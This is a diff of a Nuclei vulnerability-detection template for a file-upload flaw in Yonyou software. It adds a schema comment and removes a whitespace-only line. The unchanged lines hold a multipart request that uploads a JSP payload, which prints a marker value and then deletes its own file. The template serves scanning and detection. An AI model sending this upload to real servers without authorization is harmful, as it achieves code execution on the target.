@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: yonyou-uploadApk-fileupload
 
 info:
@@ -27,7 +28,7 @@ http:
         ------WebKitFormBoundaryvLTG6zlX0gZ8LzO
         Content-Disposition:form-data;name="downloadpath";filename="{{filename}}"
         Content-Type:application/msword
-        
+
         <% out.print(1111*2222);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
         ------WebKitFormBoundaryvLTG6zlX0gZ8LzO--
 
